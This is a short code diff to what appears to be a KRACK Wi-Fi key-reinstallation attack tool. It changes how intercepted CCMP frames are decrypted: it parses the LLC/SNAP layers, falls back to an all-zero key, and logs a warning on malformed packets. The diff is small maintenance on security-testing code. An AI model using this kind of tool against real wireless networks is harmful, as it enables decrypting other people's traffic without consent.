@@ -109,13 +109,12 @@ class ClientState():
 
 	def decrypt(self, p, hostapd_ctrl):
 		payload = get_ccmp_payload(p)
-		llcsnap, packet = payload[:8], payload[8:]
 
 		if payload.startswith(b"\xAA\xAA\x03\x00\x00\x00"):
 			# On some kernels, the virtual interface associated to the real AP interface will return
 			# frames where the payload is already decrypted (this happens when hardware decryption is
 			# used). So if the payload seems decrypted, just extract the full plaintext from the frame.
-			plaintext = payload
+			plaintext = LLC(payload)
 		else:
 			key       = self.get_encryption_key(hostapd_ctrl)
 			plaintext = decrypt_ccmp(p, key)
@@ -123,6 +122,10 @@ class ClientState():
 			# If it still fails, try an all-zero key
 			if plaintext == None:
 				plaintext = decrypt_ccmp(p, b"\x00" * 16)
+
+			# No need for the whole packet, just the plaintext payload
+			if plaintext != None:
+				plaintext = plaintext[LLC]
 
 		return plaintext
 
@@ -308,6 +311,9 @@ class KRAckAttackClient():
 		plaintext = client.decrypt(p, self.hostapd_ctrl)
 		if plaintext == None:
 			return
+		if not SNAP in plaintext:
+			log(WARNING, f"No SNAP layer in decrypted packet {plaintext}")
+			return None
 
 		# Now process the packet as if it were a valid (non-replayed) one
 		decap = header/plaintext[SNAP].payload
